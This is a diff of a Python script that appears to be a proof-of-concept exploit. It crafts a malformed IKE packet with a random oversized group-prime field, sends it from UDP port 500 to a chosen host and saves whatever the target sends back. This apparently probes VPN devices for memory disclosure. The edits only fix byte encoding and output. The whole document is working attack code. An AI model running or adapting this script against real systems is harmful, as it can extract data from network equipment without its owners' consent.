@@ -1,17 +1,16 @@
 #!/usr/bin/env python
 import argparse
 import socket
-import binascii
 from struct import pack
 import random
 
 def makeInitiatorSPI():
-	initiatorSPI = ''.join([chr(random.randint(0, 255)) for n in range(8)])
-	return bytearray(initiatorSPI, 'utf-8')
+	initiatorSPI = ''.join([str(chr(random.randint(0, 127))) for n in range(8)])
+	return bytes(initiatorSPI, 'utf-8')
 
 def makeGroupPrime(bits):
-    groupPrime = ''.join([chr(random.randint(0, 255)) for n in range(bits // 8)])
-    return groupPrime
+	groupPrime = ''.join([str(chr(random.randint(0, 127))) for n in range(bits // 8)])
+	return bytes(groupPrime, 'utf-8')
 
 def makePacket(length):
 	groupPrime = makeGroupPrime(length)
@@ -40,10 +39,8 @@ def makePacket(length):
 	pkt += b'\x00\x20\xc4\x9b\x80\x02\x00\x02'
 	pkt += b'\x80\x04\x00\x01\x00\x06'
 	pkt += pack('>H', groupPrimeLen)
-	pkt += bytes(groupPrime, 'utf-8')
+	pkt += groupPrime
 	pkt += b'\x80\x03\x00\x01'
-
-	print("{}\n".format(pkt))
 	return pkt
 
 def main():
@@ -61,14 +58,16 @@ def main():
 	fd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	fd.bind(('', 500))
 	fd.connect((args.host, args.port))
-
+	
 	payload = makePacket(args.numbits)
+
+	print(payload.hex())
+
 	fd.send(payload)
-	r = fd.recv(4096*16)
-	print(r)
+	data = fd.recv(4096*16)
 	infile.write(payload)
 	infile.close()
-	out.write(r)
+	out.write(data)
 	out.close()
 
 	print ('[+] Response saved in {} - and send request {}'.format(args.outfile,args.infile))
